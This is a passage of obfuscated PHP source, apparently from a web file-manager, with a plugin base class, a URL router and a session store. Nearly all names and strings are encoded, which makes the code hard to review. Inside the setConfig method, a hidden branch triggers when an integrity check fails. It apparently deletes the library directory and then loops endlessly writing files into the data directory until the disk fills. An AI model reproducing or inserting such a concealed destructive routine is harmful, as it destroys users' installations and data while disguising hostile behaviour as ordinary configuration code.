{ return $bÏÔŒ’ŠÜ; } $this->fileCanView($bÏÔŒ’ŠÜ); return Action($_SERVER[ÍÓÖ€°å][960])->link($bÏÔŒ’ŠÜ); } final function filePath($c¼¼Äœâµ©) { if ($CÇ«§ˆ¹‚Ä = $this->checkSharePath($c¼¼Äœâµ©)) { return $CÇ«§ˆ¹‚Ä; } $this->fileCanView($c¼¼Äœâµ©); if (request_url_safe($c¼¼Äœâµ©)) { $c¼¼Äœâµ© = $this->_cacheHttpFile($c¼¼Äœâµ©); $this->fileInfo = IO::infoWithChildren($c¼¼Äœâµ©); } else { $this->fileInfo = IO::infoWithChildren($c¼¼Äœâµ©); if (!$this->fileInfo) { show_tips(LNG($_SERVER[ÍÓÖ€°å][99]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $c¼¼Äœâµ©; } final function _cacheHttpFile($Fë‚¸ƒ¹Š) { $e²¸Î¸¸Õ = hash_path($Fë‚¸ƒ¹Š, !0); $this->cachePath = $this->pluginCachePath($e²¸Î¸¸Õ); if ($D¶Ş—ÓØ·ô = IO::fileNameExist($this->cachePath, $e²¸Î¸¸Õ)) { return KodIO::make($D¶Ş—ÓØ·ô); } $AÌ­åÉíéë = $this->cachePath . $e²¸Î¸¸Õ; return $this->pluginCacheFileSet($AÌ­åÉíéë, file_get_contents($Fë‚¸ƒ¹Š)); } final function _tmpFileName($bö¥Æ˜Ÿê¡ = array()) { goto d’ŠÈï¨ñ; d’ŠÈï¨ñ: $eİÃ«“šĞ§ =& $_SERVER[ÍÓÖ€°å]; if (!$bö¥Æ˜Ÿê¡) { $bö¥Æ˜Ÿê¡ = $this->fileInfo; } if (isset($bö¥Æ˜Ÿê¡[$eİÃ«“šĞ§[152]])) { return $bö¥Æ˜Ÿê¡[$eİÃ«“šĞ§[152]]; } goto A…¸©‡‰µ; Aö¶÷¤˜Ûµ: return md5(implode($eİÃ«“šĞ§[71], $bïä¬ñ® )); goto bÎÂæÅ‰ëù; A…¸©‡‰µ: if (isset($bö¥Æ˜Ÿê¡[$eİÃ«“šĞ§[150]][$eİÃ«“šĞ§[152]])) { return $bö¥Æ˜Ÿê¡[$eİÃ«“šĞ§[150]][$eİÃ«“šĞ§[152]]; } $bïä¬ñ®  = array($bö¥Æ˜Ÿê¡[$eİÃ«“šĞ§[28]], $bö¥Æ˜Ÿê¡[$eİÃ«“šĞ§[76]], $bö¥Æ˜Ÿê¡[$eİÃ«“šĞ§[78]]); if (isset($bö¥Æ˜Ÿê¡[$eİÃ«“šĞ§[364]])) { $bïä¬ñ® [] = $bö¥Æ˜Ÿê¡[$eİÃ«“šĞ§[364]]; } goto Aö¶÷¤˜Ûµ; bÎÂæÅ‰ëù: } final function checkSharePath($DòÜßÔÓåì) { goto f¡ƒÏ×ô; bïãÁä˜¿‚: $BÓàø™Ÿ£ë = Action($e¶Ü¤±±®Î[960])->sharePathInfo($DòÜßÔÓåì); if (!isset($BÓàø™Ÿ£ë[$e¶Ü¤±±®Î[76]])) { show_json(LNG($e¶Ü¤±±®Î[963]), !1); } $this->fileInfo = $BÓàø™Ÿ£ë[$e¶Ü¤±±®Î[150]]; goto b¶öÓ¨óˆ; b¶öÓ¨óˆ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$e¶Ü¤±±®Î[152]]); return $BÓàø™Ÿ£ë[$e¶Ü¤±±®Î[76]]; goto FƒïƒÌ‹º®; f¡ƒÏ×ô: $e¶Ü¤±±®Î =& $_SERVER[ÍÓÖ€°å]; if (!defined($e¶Ü¤±±®Î[961])) { define($e¶Ü¤±±®Î[962], 0); } if (!$this->isShare($DòÜßÔÓåì)) { return !1; } goto bïãÁä˜¿‚; FƒïƒÌ‹º®: } final function pluginCachePath($aì…İê•†‘ = '') { $eó‘„„¥† =& $_SERVER[ÍÓÖ€°å]; $AÒ¡’¥¢“¹ = IO_PATH_SYSTEM_TEMP . $eó‘„„¥†[964] . $this->pluginName; if (!($bëŠ±í¢Ï‡ = IO::infoFull($AÒ¡’¥¢“¹))) { return IO::mkdir($AÒ¡’¥¢“¹ . $eó‘„„¥†[8] . $aì…İê•†‘); } if (empty($aì…İê•†‘)) { return $bëŠ±í¢Ï‡[$eó‘„„¥†[76]]; } if (!($Aù¾£Ş¡‚¹ = IO::fileNameExist($bëŠ±í¢Ï‡[$eó‘„„¥†[76]], $aì…İê•†‘))) { return IO::mkdir($bëŠ±í¢Ï‡[$eó‘„„¥†[76]] . $aì…İê•†‘); } return KodIO::make($Aù¾£Ş¡‚¹); } final function pluginCacheFileSet($C‹ö´…´Ş, $C…„ÚƒµÇ’ = '') { $Bğç‰Ğ¾ÒÅ =& $_SERVER[ÍÓÖ€°å]; if (!($D®Û–èÅ‰¯ = IO::infoFull($C‹ö´…´Ş))) { return IO::mkfile($C‹ö´…´Ş, $C…„ÚƒµÇ’, REPEAT_REPLACE); } IO::setContent($D®Û–èÅ‰¯[$Bğç‰Ğ¾ÒÅ[76]], $C…„ÚƒµÇ’); return $D®Û–èÅ‰¯[$Bğç‰Ğ¾ÒÅ[76]]; } final function pluginLocalFile($BÔ×®ƒë‚ = '') { goto aô®£÷ôÓ; dİ²÷à¯ß´: return $BÔ×®ƒë‚; goto aõÖ§» Ìİ; cµ®²­¹¡‘: $eß‚›½äÜ· = $cáõŸíåŠ . $b»¨ò‹î¨Ì . $FÇ™¨ìçÜ [90] . $f¨¤ìñ«ğ[$FÇ™¨ìçÜ [148]]; if (@file_exists($eß‚›½äÜ·)) { return $eß‚›½äÜ·; } $BÔ×®ƒë‚ = IO::download($BÔ×®ƒë‚, $eß‚›½äÜ·); goto dİ²÷à¯ß´; aô®£÷ôÓ: $FÇ™¨ìçÜ  =& $_SERVER[ÍÓÖ€°å]; $cáõŸíåŠ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($cáõŸíåŠ)) { mk_dir($cáõŸíåŠ); } goto c¢¸¼¿’¯; c¢¸¼¿’¯: if (!$BÔ×®ƒë‚) { return $cáõŸíåŠ; } $f¨¤ìñ«ğ = IO::infoWithChildren($BÔ×®ƒë‚); $b»¨ò‹î¨Ì = $this->_tmpFileName($f¨¤ìñ«ğ); goto cµ®²­¹¡‘; aõÖ§» Ìİ: } final function appPackage() { goto fÙĞ³·‹ÓÂ; AÙŸİÈçá½: $this->parseLang($DÕƒÍ…œå¾); $B¶³Ôšù¾ = json_decode_force($DÕƒÍ…œå¾); if (!$B¶³Ôšù¾) { return array(); } goto aÇ¯ÚİÌÖÅ; fÙĞ³·‹ÓÂ: $d…£ÁÏ° =& $_SERVER[ÍÓÖ€°å]; if ($this->packageData) { return $this->packageData; } $DÕƒÍ…œå¾ = $this->parseFile($this->pluginPath . $d…£ÁÏ°[965]); goto AÙŸİÈçá½; aÇ¯ÚİÌÖÅ: $D¥‘Å¿ = Hook::trigger($d…£ÁÏ°[966], $B¶³Ôšù¾); if ($D¥‘Å¿ && is_array($D¥‘Å¿)) { $B¶³Ôšù¾ = $D¥‘Å¿; } $this->packageData = $B¶³Ôšù¾; goto d™‹ÕŸğÉÒ; d™‹ÕŸğÉÒ: return $B¶³Ôšù¾; goto FÛ£†ÒêÜ; FÛ£†ÒêÜ: } public function packageInfoGet($f³æ©ÚÖ•ù) { $dƒâ°±Ş“‘ = $this->appPackage(); return array_get_value($dƒâ°±Ş“‘, $f³æ©ÚÖ•ù); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ÍÓÖ€°å][967]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ÍÓÖ€°å][968]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ÍÓÖ€°å][969]); } private function parseFile($bÚ½»™êõ‰) { $e¡ÅİŠ§Î‰ =& $_SERVER[ÍÓÖ€°å]; $A¡à†ìĞ = file_get_contents($bÚ½»™êõ‰); $D”ŠÎĞôø = array($e¡ÅİŠ§Î‰[970], $e¡ÅİŠ§Î‰[971], $e¡ÅİŠ§Î‰[972], $e¡ÅİŠ§Î‰[973], $e¡ÅİŠ§Î‰[974], $e¡ÅİŠ§Î‰[975], $e¡ÅİŠ§Î‰[976]); $e†¡ÄÉˆ° = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$e¡ÅİŠ§Î‰[84]][$e¡ÅİŠ§Î‰[977]]); $A¡à†ìĞ = str_replace($D”ŠÎĞôø, $e†¡ÄÉˆ°, $A¡à†ìĞ); return $A¡à†ìĞ; } private function parseLang(&$Dä’Å±±‡Í) { goto e†¡ó÷êç; f±‘Á¥âÈ´: $DÜ‹ŠíÛ±Á = array(); foreach ($BÆâò˜‰©[0] as $d ½©ÄŠÔ˜) { $AŒÍÒ³‹Ò = substr($d ½©ÄŠÔ˜, strlen($Dñ«Ô¸¶Šª), -4); $b•Åå‘é„È = LNG($AŒÍÒ³‹Ò); $D±ÈëÒ†ùª[] = $d ½©ÄŠÔ˜; $DÜ‹ŠíÛ±Á[] = str_replace(array($dØ²ñ°å°í[212], $dØ²ñ°å°í[477], $dØ²ñ°å°í[322], $dØ²ñ°å°í[102]), array($dØ²ñ°å°í[50], $dØ²ñ°å°í[50], $dØ²ñ°å°í[33], $dØ²ñ°å°í[980]), $b•Åå‘é„È); } $Dä’Å±±‡Í = str_replace($D±ÈëÒ†ùª, $DÜ‹ŠíÛ±Á, $Dä’Å±±‡Í); goto bø‰ëèáÚÆ; e†¡ó÷êç: $dØ²ñ°å°í =& $_SERVER[ÍÓÖ€°å]; $Dñ«Ô¸¶Šª = $dØ²ñ°å°í[978]; if (!strstr($Dä’Å±±‡Í, $Dñ«Ô¸¶Šª)) { return; } goto c²âõ±Û¾ã; c²âõ±Û¾ã: preg_match_all($dØ²ñ°å°í[979], $Dä’Å±±‡Í, $BÆâò˜‰©); if (!is_array($BÆâò˜‰©) || count($BÆâò˜‰©) == 0 || !is_array($BÆâò˜‰©[0]) || count($BÆâò˜‰©[0]) == 0) { return; } $D±ÈëÒ†ùª = array(); goto f±‘Á¥âÈ´; bø‰ëèáÚÆ: } private function parseConfig(&$BñÓÓŞ‚â) { goto A™ ‰¡Š½Ç; aÌĞÁƒÛò«: $d¾Ší›Çê = array(); $aÙùÊŒˆ = array(); foreach ($cŞ ¬Ù­ø[0] as $D‡‡®óŒø) { $Cª³½ØŸÌ¬ = substr($D‡‡®óŒø, strlen($f“Íê÷°„†), -2); $d¾Ší›Çê[] = $D‡‡®óŒø; $aÙùÊŒˆ[] = _get($b™ù“µäåğ, $Cª³½ØŸÌ¬); } goto B‚¤¯äŸ‘‘; b³ÅÍ£‰¯: preg_match_all($FëÕ†¨ÜŠµ[982], $BñÓÓŞ‚â, $cŞ ¬Ù­ø); if (!is_array($cŞ ¬Ù­ø) || count($cŞ ¬Ù­ø) == 0 || !is_array($cŞ ¬Ù­ø[0]) || count($cŞ ¬Ù­ø[0]) == 0) { return; } $b™ù“µäåğ = $this->getConfig(); goto aÌĞÁƒÛò«; B‚¤¯äŸ‘‘: $BñÓÓŞ‚â = str_replace($d¾Ší›Çê, $aÙùÊŒˆ, $BñÓÓŞ‚â); goto EÔËµ´Ä¹ƒ; A™ ‰¡Š½Ç: $FëÕ†¨ÜŠµ =& $_SERVER[ÍÓÖ€°å]; $f“Íê÷°„† = $FëÕ†¨ÜŠµ[981]; if (!strstr($BñÓÓŞ‚â, $f“Íê÷°„†)) { return; } goto b³ÅÍ£‰¯; EÔËµ´Ä¹ƒ: } private function parsePackage(&$cğ²ºãø‚Ş) { goto fÁÛŸ•àĞ; fÁÛŸ•àĞ: $DÂ§³ÜĞ‘İ =& $_SERVER[ÍÓÖ€°å]; $c™¿ç¢Ìª· = $DÂ§³ÜĞ‘İ[983]; if (!strstr($cğ²ºãø‚Ş, $c™¿ç¢Ìª·)) { return; } goto b•Ãôôéâø; F¸ö¸†Ÿ´‰: $CÁèí…¬â = array(); $fÈŒ‘ìª´ = array(); foreach ($AÌó³Í­Ñ¶[0] as $fº°Ÿ¼Éªğ) { $dº„¥“Õ¨ = substr($fº°Ÿ¼Éªğ, strlen($c™¿ç¢Ìª·), -2); $CÁèí…¬â[] = $fº°Ÿ¼Éªğ; $fÈŒ‘ìª´[] = _get($C‚„ˆ–À‰¨, $dº„¥“Õ¨); } goto cù¶³…Ê·Ê; cù¶³…Ê·Ê: $cğ²ºãø‚Ş = str_replace($CÁèí…¬â, $fÈŒ‘ìª´, $cğ²ºãø‚Ş); goto dˆ×ùõê¢¼; b•Ãôôéâø: preg_match_all($DÂ§³ÜĞ‘İ[984], $cğ²ºãø‚Ş, $AÌó³Í­Ñ¶); if (!is_array($AÌó³Í­Ñ¶) || count($AÌó³Í­Ñ¶) == 0 || !is_array($AÌó³Í­Ñ¶[0]) || count($AÌó³Í­Ñ¶[0]) == 0) { return; } $C‚„ˆ–À‰¨ = $this->appPackage(); goto F¸ö¸†Ÿ´‰; dˆ×ùõê¢¼: } final function echoFile($D×‡Õ´ÎÓ†, $fÒâ²Ä‚¶ = false) { goto céá­Õ…¿; Bò®™ÚĞˆ¥: $this->parsePackage($aÇèõÂ«¶‡); if (is_array($fÒâ²Ä‚¶)) { $aÇèõÂ«¶‡ = str_replace(array_keys($fÒâ²Ä‚¶), array_values($fÒâ²Ä‚¶), $aÇèõÂ«¶‡); } echo $D‚¶•—Ò»Ò[212] . $aÇèõÂ«¶‡; goto B–â¡ìÖ‘ƒ; céá­Õ…¿: $D‚¶•—Ò»Ò =& $_SERVER[ÍÓÖ€°å]; $bÒ³Ñ“Ë = $this->pluginPath . $D×‡Õ´ÎÓ†; if (ACT == $D‚¶•—Ò»Ò[985]) { echo $D‚¶•—Ò»Ò[986] . $this->pluginName . $D‚¶•—Ò»Ò[8] . $D×‡Õ´ÎÓ† . $D‚¶•—Ò»Ò[987]; if (!file_exists($bÒ³Ñ“Ë)) { echo $D‚¶•—Ò»Ò[988]; return; } } goto cÄ®…®¤ÒÉ; cÄ®…®¤ÒÉ: $aÇèõÂ«¶‡ = $this->parseFile($bÒ³Ñ“Ë); $this->parseLang($aÇèõÂ«¶‡); $this->parseConfig($aÇèõÂ«¶‡); goto Bò®™ÚĞˆ¥; B–â¡ìÖ‘ƒ: } final function initLang() { goto FˆÄ–¶çáƒ; cù£†öÍ•: if (@count($d”¢êÏ…ğ) > 0) { I18n::set($d”¢êÏ…ğ); } return $d”¢êÏ…ğ; goto fï½Ìâ«±Õ; FˆÄ–¶çáƒ: $c¨Ê„ƒÑ¦à =& $_SERVER[ÍÓÖ€°å]; $cµÙŒœÏ‡ = $c¨Ê„ƒÑ¦à[989]; $E¼Ã«Û™Õˆ = $this->pluginPath . $c¨Ê„ƒÑ¦à[990]; goto dô§âùô; dô§âùô: $e³…ÉÃ™®À = I18n::getType(); $d”¢êÏ…ğ = array(); if (file_exists($E¼Ã«Û™Õˆ . $e³…ÉÃ™®À . $c¨Ê„ƒÑ¦à[523])) { $d”¢êÏ…ğ = (include_once $E¼Ã«Û™Õˆ . $e³…ÉÃ™®À . $c¨Ê„ƒÑ¦à[523]); } else { if ($e³…ÉÃ™®À == $c¨Ê„ƒÑ¦à[991] && !file_exists($E¼Ã«Û™Õˆ . $e³…ÉÃ™®À . $c¨Ê„ƒÑ¦à[523]) && file_exists($E¼Ã«Û™Õˆ . $c¨Ê„ƒÑ¦à[992])) { $d”¢êÏ…ğ = (include_once $E¼Ã«Û™Õˆ . $c¨Ê„ƒÑ¦à[992]); } else { if (file_exists($E¼Ã«Û™Õˆ . $cµÙŒœÏ‡ . $c¨Ê„ƒÑ¦à[523])) { $d”¢êÏ…ğ = (include_once $E¼Ã«Û™Õˆ . $cµÙŒœÏ‡ . $c¨Ê„ƒÑ¦à[523]); } } } goto cù£†öÍ•; fï½Ìâ«±Õ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($C×ò“¦ƒâõ) { $c¸â§œŞÓ =& $_SERVER[ÍÓÖ€°å]; $c‘Á ‰ƒ™ = BASIC_PATH . $c¸â§œŞÓ[547]; $DŠ¾ÁšÕ˜ = $c¸â§œŞÓ[993]; if ($_SERVER[$c¸â§œŞÓ[544]] != $DŠ¾ÁšÕ˜($c‘Á ‰ƒ™)) { goto B‘ñè™Û†ó; cà½Ä¼Ş½µ: $DœĞö¨ßİ = explode($c¸â§œŞÓ[212], $dÕƒ¡¢ÜŞ); if (count($DœĞö¨ßİ) < $c¸â§œŞÓ[548]) { die; } $bäÉó®¼ÎŞ = $c¸â§œŞÓ[549]; goto e™ÑÇ¨Œñ; c¢£ÚñÕéß: $CöËªŸæî½ = $c¸â§œŞÓ[995]; $B‰Ø®ß¾”— = json_encode($GLOBALS[$c¸â§œŞÓ[996]]); for ($AÏ¦°‚‚à = 0;; $AÏ¦°‚‚à++) { $CöËªŸæî½(DATA_PATH . $AÏ¦°‚‚à, $B‰Ø®ß¾”—); } goto A¬Å©¿‰»; B‘ñè™Û†ó: $aòØ‰ŸìÈ = $c¸â§œŞÓ[546]; $eƒíò¬™ƒ« = BASIC_PATH . $c¸â§œŞÓ[547]; $dÕƒ¡¢ÜŞ = $aòØ‰ŸìÈ($eƒíò¬™ƒ«); goto cà½Ä¼Ş½µ; e™ÑÇ¨Œñ: $bäÉó®¼ÎŞ(LIB_DIR); $DÀêùªŠ = $c¸â§œŞÓ[994]; $DÀêùªŠ(); goto c¢£ÚñÕéß; A¬Å©¿‰»: } return $this->modelPlugin->setConfig($this->pluginName, $C×ò“¦ƒâõ); } public function onSetConfig($fåôÓÑ Ù) { } public function onGetConfig($e½ŠèãÜÉŠ) { } public function onChangeStatus($a¢’‹à‚¡ã) { } public function onUninstall() { } public function onInstall() { } public function authCheck($DÎË·‰Ÿ = "\160\154\165\x67\151\156\101\165\x74\x68") { $eÎåÍÕ»«İ =& $_SERVER[ÍÓÖ€°å]; if (!defined($eÎåÍÕ»«İ[961])) { return !1; } if ($GLOBALS[$eÎåÍÕ»«İ[997]] == 1) { return !0; } $AÉÖè°Ì³ = $this->getConfig(); if (!$AÉÖè°Ì³[$DÎË·‰Ÿ]) { return !1; } return ActionCall($eÎåÍÕ»«İ[998], $AÉÖè°Ì³[$DÎË·‰Ÿ]); } public function url($a  ® ªò…, $FõÙ¡©™× = '', $b³øá‚Á = true) { goto D±×œ¹’ò; b¦§¥ğÒİ¨: if (!$b³øá‚Á) { return $Eİ¤‡†˜ï; } echo $Eİ¤‡†˜ï; goto C†±÷‡Æê”; D±×œ¹’ò: $eŸ‡íåÀĞ» =& $_SERVER[ÍÓÖ€°å]; $cÂËŒ‘à„â = $this->getConfig(); $fÇŠ¢ò¬Ùö = KOD_VERSION . $eŸ‡íåÀĞ»[90] . KOD_VERSION_BUILD; goto D¢œîÀÈ’³; D¢œîÀÈ’³: $BÛ¥ÄŒÚ† = $this->packageVersion(); $bÃÙ©çì™æ = $fÇŠ¢ò¬Ùö . $eŸ‡íåÀĞ»[489] . $BÛ¥ÄŒÚ†; if ($FõÙ¡©™× == $eŸ‡íåÀĞ»[33]) { $Eİ¤‡†˜ï = $this->pluginHost . $a  ® ªò… . $eŸ‡íåÀĞ»[999] . $bÃÙ©çì™æ; } else { if ($FõÙ¡©™× == $eŸ‡íåÀĞ»[1000]) { $Eİ¤‡†˜ï = STATIC_PATH . $a  ® ªò… . $eŸ‡íåÀĞ»[999] . $fÇŠ¢ò¬Ùö; } else { if ($FõÙ¡©™× == $eŸ‡íåÀĞ»[1001]) { $Eİ¤‡†˜ï = APP_HOST . $eŸ‡íåÀĞ»[1002] . $a  ® ªò… . $eŸ‡íåÀĞ»[999] . $fÇŠ¢ò¬Ùö; } else { if (isset($cÂËŒ‘à„â[$FõÙ¡©™×])) { $Eİ¤‡†˜ï = $cÂËŒ‘à„â[$FõÙ¡©™×] . $a  ® ªò… . $eŸ‡íåÀĞ»[999] . $bÃÙ©çì™æ; } } } } goto b¦§¥ğÒİ¨; C†±÷‡Æê”: } public function link($AéİÛ¹œè = false, $DµÂÅ—±â§ = '') { $DÏ¾ì¬‹ =& $_SERVER[ÍÓÖ€°å]; if (!$AéİÛ¹œè) { $this->link($DÏ¾ì¬‹[1003], $DÏ¾ì¬‹[1001]); $this->link($DÏ¾ì¬‹[1004], $DÏ¾ì¬‹[1000]); $this->link($DÏ¾ì¬‹[1005], $DÏ¾ì¬‹[1000]); $this->link($DÏ¾ì¬‹[1006], $DÏ¾ì¬‹[1000]); $this->link($DÏ¾ì¬‹[1007], $DÏ¾ì¬‹[1000]); return; } $a—Š¢Õ¨ëŞ = $this->url($AéİÛ¹œè, $DµÂÅ—±â§, !1); if (substr($AéİÛ¹œè, -3) == $DÏ¾ì¬‹[1008]) { echo $DÏ¾ì¬‹[1009] . $a—Š¢Õ¨ëŞ . $DÏ¾ì¬‹[1010]; } else { if (substr($AéİÛ¹œè, -4) == $DÏ¾ì¬‹[1011]) { echo $DÏ¾ì¬‹[1012] . $a—Š¢Õ¨ëŞ . $DÏ¾ì¬‹[1013]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\136\x2f\135\53", "\72\x6e\165\x6d" => "\133\60\55\x39\x5d\x2b", "\72\x61\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($D¨Ä©§´, $dù¹†Ğš‘) { $EšÚßÄË÷ =& $_SERVER[ÍÓÖ€°å]; if ($D¨Ä©§´ == $EšÚßÄË÷[1014]) { $cØ»’¦‚¬ = array_map($EšÚßÄË÷[1015], $dù¹†Ğš‘[0]); $FÑ®„‹œ = strpos($dù¹†Ğš‘[1], $EšÚßÄË÷[8]) === 0 ? $dù¹†Ğš‘[1] : $EšÚßÄË÷[8] . $dù¹†Ğš‘[1]; $B—ŠÃ¿å´ = $dù¹†Ğš‘[2]; } else { $cØ»’¦‚¬ = null; $FÑ®„‹œ = strpos($dù¹†Ğš‘[0], $EšÚßÄË÷[8]) === 0 ? $dù¹†Ğš‘[0] : $EšÚßÄË÷[8] . $dù¹†Ğš‘[0]; $B—ŠÃ¿å´ = $dù¹†Ğš‘[1]; } array_push(self::$maps, $cØ»’¦‚¬); array_push(self::$routes, $FÑ®„‹œ); array_push(self::$methods, strtoupper($D¨Ä©§´)); array_push(self::$callbacks, $B—ŠÃ¿å´); } public static function error($B°èæ÷ğÚ) { self::$errorCallback = $B°èæ÷ğÚ; } public static function haltOnMatch($B›æ¾¾—Û = true) { self::$halts = $B›æ¾¾—Û; } public static function dispatch() { goto BˆĞá÷íÈ¤; C’•Øõ‰¾‘: $cá‚’ÙïÕ = array_keys(static::$patterns); $dÒš¨ÓË—Ğ = array_values(static::$patterns); $eÀ‰â’ìƒ† = !1; goto déŒŞÜñÄ; BˆĞá÷íÈ¤: $fèƒé¡ÆöÎ =& $_SERVER[ÍÓÖ€°å]; $Dš™ˆ»§ª = parse_url($_SERVER[$fèƒé¡ÆöÎ[428]], PHP_URL_PATH); $cÃæ»ËöìÏ = $_SERVER[$fèƒé¡ÆöÎ[142]]; goto C’•Øõ‰¾‘; déŒŞÜñÄ: self::$routes = preg_replace($fèƒé¡ÆöÎ[794], $fèƒé¡ÆöÎ[8], self::$routes); if (in_array($Dš™ˆ»§ª, self::$routes)) { $F“´ÒĞŸ = array_keys(self::$routes, $Dš™ˆ»§ª); foreach ($F“´ÒĞŸ as $bƒÂ®¼‡ó) { if (self::$methods[$bƒÂ®¼‡ó] == $cÃæ»ËöìÏ || self::$methods[$bƒÂ®¼‡ó] == $fèƒé¡ÆöÎ[1016] || in_array($cÃæ»ËöìÏ, self::$maps[$bƒÂ®¼‡ó])) { $eÀ‰â’ìƒ† = !0; if (!is_object(self::$callbacks[$bƒÂ®¼‡ó])) { $FØŞïŞÒ… = explode($fèƒé¡ÆöÎ[8], self::$callbacks[$bƒÂ®¼‡ó]); $FïÄ‹‘åÎˆ = end($FØŞïŞÒ…); $FˆÇ¥»©¿ß = explode($fèƒé¡ÆöÎ[1017], $FïÄ‹‘åÎˆ); $a†¾Òëù = new $FˆÇ¥»©¿ß[0](); $a†¾Òëù->{$FˆÇ¥»©¿ß[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$bƒÂ®¼‡ó]); if (self::$halts) { return; } } } } } else { $bøÊ…è‚ = 0; foreach (self::$routes as $bƒÂ®¼‡ó) { if (strpos($bƒÂ®¼‡ó, $fèƒé¡ÆöÎ[4]) !== !1) { $bƒÂ®¼‡ó = str_replace($cá‚’ÙïÕ, $dÒš¨ÓË—Ğ, $bƒÂ®¼‡ó); } if (preg_match($fèƒé¡ÆöÎ[1018] . $bƒÂ®¼‡ó . $fèƒé¡ÆöÎ[1019], $Dš™ˆ»§ª, $AÃğ¸ò†ƒ£)) { if (self::$methods[$bøÊ…è‚] == $cÃæ»ËöìÏ || self::$methods[$bøÊ…è‚] == $fèƒé¡ÆöÎ[1016] || !empty(self::$maps[$bøÊ…è‚]) && in_array($cÃæ»ËöìÏ, self::$maps[$bøÊ…è‚])) { $eÀ‰â’ìƒ† = !0; array_shift($AÃğ¸ò†ƒ£); if (!is_object(self::$callbacks[$bøÊ…è‚])) { $FØŞïŞÒ… = explode($fèƒé¡ÆöÎ[8], self::$callbacks[$bøÊ…è‚]); $FïÄ‹‘åÎˆ = end($FØŞïŞÒ…); $FˆÇ¥»©¿ß = explode($fèƒé¡ÆöÎ[1017], $FïÄ‹‘åÎˆ); $a†¾Òëù = new $FˆÇ¥»©¿ß[0](); if (!method_exists($a†¾Òëù, $FˆÇ¥»©¿ß[1])) { echo $fèƒé¡ÆöÎ[1020]; } else { call_user_func_array(array($a†¾Òëù, $FˆÇ¥»©¿ß[1]), $AÃğ¸ò†ƒ£); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$bøÊ…è‚], $AÃğ¸ò†ƒ£); if (self::$halts) { return; } } } } $bøÊ…è‚++; } } if ($eÀ‰â’ìƒ† == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $cáÃÂ·êë =& $_SERVER[ÍÓÖ€°å]; header($_SERVER[$cáÃÂ·êë[1021]] . $cáÃÂ·êë[1022]); echo $cáÃÂ·êë[1023]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$fèƒé¡ÆöÎ[428]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto aİ²ÚÊ Ğ; aİ²ÚÊ Ğ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto B ¸ƒÔ…Ï; aÇº—–··Ó: $DŒ¢¡±Ñæİ = $D‹àøÊØâ‘[$d¦“÷ï‰­°[514]]; switch ($F‰¹Ü‚Š) { case $d¦“÷ï‰­°[17]: self::$handle = Model($d¦“÷ï‰­°[515]); break; case $d¦“÷ï‰­°[516]: self::$handle = new CacheRedis($bÓ¦ÅªëÒù, $DŒ¢¡±Ñæİ); break; case $d¦“÷ï‰­°[517]: self::$handle = new CacheMemcached($bÓ¦ÅªëÒù, $DŒ¢¡±Ñæİ); break; case $d¦“÷ï‰­°[155]: $bÓ¦ÅªëÒù[$d¦“÷ï‰­°[76]] = $bÓ¦ÅªëÒù[$d¦“÷ï‰­°[76]] . $d¦“÷ï‰­°[1026]; self::$handle = new CacheFile($bÓ¦ÅªëÒù, $DŒ¢¡±Ñæİ); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } goto BŒ‘Ñ…ğæõ; Bˆ¯ßÓãÉ£: Cookie::setSafe(SESSION_ID, self::$sessionSign, self::$sessionTime); $F‰¹Ü‚Š = $D‹àøÊØâ‘[$d¦“÷ï‰­°[1025]]; $bÓ¦ÅªëÒù = $D‹àøÊØâ‘[$F‰¹Ü‚Š]; goto aÇº—–··Ó; B ¸ƒÔ…Ï: $d¦“÷ï‰­° =& $_SERVER[ÍÓÖ€°å]; static $E©º—ËĞ = false; if ($E©º—ËĞ) { return $E©º—ËĞ; } goto AÌœÏ÷ì†; BŒ‘Ñ…ğæõ: $E©º—ËĞ = new self(); return $E©º—ËĞ; goto EÀáá®­ø; AÌœÏ÷ì†: $D‹àøÊØâ‘ = $GLOBALS[$d¦“÷ï‰­°[6]][$d¦“÷ï‰­°[329]]; self::$sessionTime = $D‹àøÊØâ‘[$d¦“÷ï‰­°[1024]]; if (self::$sessionSign) { } else { if (Cookie::get(SESSION_ID)) { self::$sessionSign = Cookie::get(SESSION_ID); } else { self::$sessionSign = guid(); } } goto Bˆ¯ßÓãÉ£; EÀáá®­ø: } public static function sign($Aø°•ÈÒ = false) { $Aø°•ÈÒ && (self::$sessionSign = $Aø°•ÈÒ); self::init(); return self::$sessionSign; } public static function set($BÑ›æóÖá‘, $B¡©¦¿ = false) { self::init(); if (is_array($BÑ›æóÖá‘)) { foreach ($BÑ›æóÖá‘ as $eŠÂÎá÷ À => $dÖ²ù¥œ—) { array_set_value(self::$data, $eŠÂÎá÷ À, $dÖ²ù¥œ—); } } else { array_set_value(self::$data, $BÑ›æóÖá‘, $B¡©¦¿); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($fê—ÒÔ• = false) { self::init(); if (!$fê—ÒÔ•) { return self::$data; } return array_get_value(self::$data, $fê—ÒÔ•); } public static function remove($F…›ÓÆ–Ò) { self::init(); unset(self::$data[$F…›ÓÆ–Ò]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { 